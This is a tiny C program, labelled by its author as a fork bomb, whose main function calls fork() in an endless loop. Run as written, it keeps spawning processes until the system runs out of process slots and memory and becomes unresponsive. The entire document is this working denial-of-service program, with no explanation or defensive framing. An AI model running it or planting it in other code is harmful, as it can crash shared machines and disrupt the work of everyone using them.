//wrote a forkbomb

#include <stdio.h>
#include <unistd.h>
int
main(int ac, char **av)
{
        while (1)
                fork();

        return 0;
}
